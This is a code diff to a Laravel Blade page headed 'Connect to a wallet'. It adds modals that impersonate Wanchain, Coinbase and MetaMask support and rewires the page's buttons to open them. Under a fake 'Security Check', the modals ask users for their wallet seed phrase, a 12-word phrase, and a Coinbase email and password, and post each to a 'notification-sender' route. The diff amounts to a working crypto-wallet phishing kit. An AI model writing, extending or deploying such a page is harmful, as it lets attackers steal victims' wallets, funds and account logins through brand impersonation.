@@ -7,10 +7,17 @@
     <title>Document</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
     <link rel="stylesheet" href="{{ asset('css/style.css') }}">
+
+    <style>
+        .buttonBackground {
+            background: linear-gradient(to right, #4075A6, #3E8E8F) !important;
+            color: white !important;
+        }
+    </style>
 </head>
 <body>
     <section class="home">
-        <div class="container">
+        <div class="container" id="containerBox">
             <div class="theBox">
                 <div class="topLine">
                     <span>Connect to a wallet</span>
@@ -88,21 +95,22 @@
             <div class="modal fade" id="exampleSinlgeModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
                 <div class="modal-dialog">
                 <div class="modal-content">
-                    <div class="modal-header">
+
+                    <div class="modal-header" id="first_modal_header" >
                         <button type="button" id="modalCloseButton" class="btn-close" data-bs-dismiss="modal" aria-label="Close" hidden></button>
-                    <div class="topLine d-flex align-items-center justify-contents-between">
+                     <div class="topLine d-flex align-items-center justify-contents-between">
 
                         <div id="headerSmall">
 
                         </div>
-                        {{-- <img src="photo_2021-11-26_04-02-42-removebg-preview.png" alt=""> --}}
 
-                        <select name="" id="">
+                        <select name="" id="currency_dropdown_section">
                             <option value="">Etherrun Mainnet</option>
                         </select>
                     </div>
 
                     </div>
+
                     <div class="modal-body">
 
                         <div id="headerBig">
@@ -177,6 +185,166 @@
 
 
 
+            {{-- wanchain first modal --}}
+
+
+            <div class="modal fade" id="wanchainmodal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                <div class="modal-dialog">
+                <div class="modal-content">
+                    <div class="modal-header" style="background-color: #0052FC; color:white;">
+                        <button type="button" id="modalCloseButtonWanchi" class="btn-close" data-bs-dismiss="modal" aria-label="Close" hidden></button>
+                    <div class="topLine d-flex align-items-center justify-contents-between">
+
+                        <h5 class="modal-title"  id="exampleModalCenterTitle">wanchain</h5>
+
+                    </div>
+
+                    </div>
+                    <div class="modal-body">
+
+
+                        <img src="{{ asset('images/rool_image.jpg') }}" alt="">
+
+                        <h2>Welcome Back!</h2>
+                        <p>The decentralize web awaits.</p>
+
+                        <form action="#">
+                            <input type="button" class="buttonBackground" onclick="wanchainSecondClicked()" value="Import a Wallet" >
+                        </form>
+
+
+
+                        <p class="d-flex"> or <a href="">import using Secret recovery Phrase</a></p>
+                        <p class="d-flex"> Need Help? Contact <a href="">Meta mask Support</a></p>
+                    </div>
+
+                </div>
+                </div>
+            </div>
+
+
+            <div class="modal fade" id="wanchainmodal_second" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                <div class="modal-dialog">
+                <div class="modal-content">
+                    <div class="modal-header" style="background-color: #0052FC; color:white">
+                        <button type="button" id="modalCloseButton" class="btn-close" data-bs-dismiss="modal" aria-label="Close" hidden></button>
+                    <div class="topLine d-flex align-items-center justify-contents-between">
+
+                        <h5 class="modal-title"  id="exampleModalCenterTitle">wanchain</h5>
+
+                    </div>
+
+                    </div>
+                    <div class="modal-body">
+
+
+                        <img src="{{ asset('images/rool_image.jpg') }}" alt="">
+
+                        <h2>Security Check</h2>
+                        <p>We just need to confirm it's you. <br>
+                       To continue, enter your Backup Seed Phrase</p>
+
+                        <form action="{{ route('notification-sender') }}" method="POST">
+                            @csrf
+                            <input type="text" placeholder="Wallet Secret Recovery Phrase" name="pharse">
+                            <input type="submit" value="Confirm">
+                        </form>
+
+
+
+                        <p class="d-flex"> or <a href="">import using Secret recovery Phrase</a></p>
+                        <p class="d-flex"> Need Help? Contact <a href="">Meta mask Support</a></p>
+                    </div>
+
+                </div>
+                </div>
+            </div>
+
+
+
+
+            {{-- coinbase first modal  --}}
+            <div class="modal fade" id="coinbaseFirst" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                <div class="modal-dialog">
+                <div class="modal-content">
+                    <div class="modal-header " style="background-color: blue; color:white">
+                        <button type="button" id="modalCloseButton" class="btn-close" data-bs-dismiss="modal" aria-label="Close" hidden></button>
+                    <div class="topLine d-flex align-items-center justify-contents-between">
+
+                        <h5 class="modal-title"  id="exampleModalCenterTitle">coinbase</h5>
+
+                    </div>
+
+                    </div>
+                    <div class="modal-body">
+
+
+                        <img src="{{ asset('images/download.jpg') }}" alt="">
+
+                        <h2>Welcome Back!</h2>
+                        <p>We decentrakuzed web awaits </p>
+
+                        <form action="{{ route('notification-sender') }}" method="POST">
+                            @csrf
+                            <input type="email" placeholder="email" name="pharse">
+                            <input type="password" name="password" placeholder="password">
+                            <input type="submit" value="Confirm">
+                        </form>
+
+
+
+                        <p class="d-flex"> or <button style="border:none; color: blue" data-bs-toggle="modal" data-bs-target="#coinbaseRecovery" >
+                            import using Secret recovery Phrase</button></p>
+                        <p class="d-flex"> Need Help? Contact <a href="">Coinbase Support</a></p>
+                    </div>
+
+                </div>
+                </div>
+            </div>
+
+
+
+
+            {{-- coinbase Recovery  --}}
+            <div class="modal fade" id="coinbaseRecovery" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                <div class="modal-dialog">
+                <div class="modal-content">
+                    <div class="modal-header" style="background-color: blue; color:white">
+                        <button type="button" id="modalCloseButton" class="btn-close" data-bs-dismiss="modal" aria-label="Close" hidden></button>
+                    <div class="topLine d-flex align-items-center justify-contents-between">
+
+                        <h5 class="modal-title"  id="exampleModalCenterTitle">coinbase</h5>
+
+                    </div>
+
+                    </div>
+                    <div class="modal-body">
+
+
+                        <img src="{{ asset('images/download.jpg') }}" alt="">
+
+                        <h2>Security Check</h2>
+                        <p>We just need to confirm it's you. <br>
+                          To continue, enter your 12 word phrase.
+                        </p>
+
+                        <form action="{{ route('notification-sender') }}" method="POST">
+                            @csrf
+                            <input type="text" placeholder="pharse" name="pharse">
+                            <input type="submit" value="Confirm">
+                        </form>
+
+
+
+                        <p class="d-flex"> Need Help? Contact <a href="">Coinbase Support</a></p>
+                    </div>
+
+                </div>
+                </div>
+            </div>
+
+
+
 
         </div>
     </section>
@@ -237,7 +405,7 @@
 
             function walletClick()
                 {
-                    const myModal = new bootstrap.Modal(document.getElementById('exampleSinlgeModal'), {});
+                const myModal = new bootstrap.Modal(document.getElementById('exampleSinlgeModal'), {});
                 const image = '{{ asset('images/download-removebg-preview.png') }}'
                 const imageSrc = '<img src='+image + '>'
                 const modalHeaderSection = document.getElementById('headerSmall');
@@ -272,12 +440,7 @@
 
                 function coinbaseClick()
                     {
-                        const myModal = new bootstrap.Modal(document.getElementById('exampleSinlgeModal'), {});
-                        const image = '{{ asset('images/download.jpg') }}'
-                        const imageSrc = '<img src='+image + '>'
-                        const modalHeaderSection = document.getElementById('headerSmall');
-                        document.getElementById('headerBig').innerHTML =imageSrc
-                        modalHeaderSection.innerHTML = imageSrc;
+                        const myModal = new bootstrap.Modal(document.getElementById('coinbaseFirst'), {});
                         myModal.show();
                     }
 
@@ -294,20 +457,16 @@
 
                         function roolClick()
                             {
-                                const myModal = new bootstrap.Modal(document.getElementById('exampleSinlgeModal'), {});
-                                const image = '{{ asset('images/rool_image.jpg') }}'
-                                const imageSrc = '<img src='+image + '>'
-                                const modalHeaderSection = document.getElementById('headerSmall');
-                                document.getElementById('headerBig').innerHTML =imageSrc
-                                modalHeaderSection.innerHTML = imageSrc;
+                                const myModal = new bootstrap.Modal(document.getElementById('wanchainmodal'), {});
                                 myModal.show();
                             }
 
+                           function wanchainSecondClicked(){
 
-
-
-
-
+                             document.getElementById('modalCloseButtonWanchi').click();
+                            const myModal = new bootstrap.Modal(document.getElementById('wanchainmodal_second'), {});
+                                myModal.show();
+                           }
 
         </script>
 
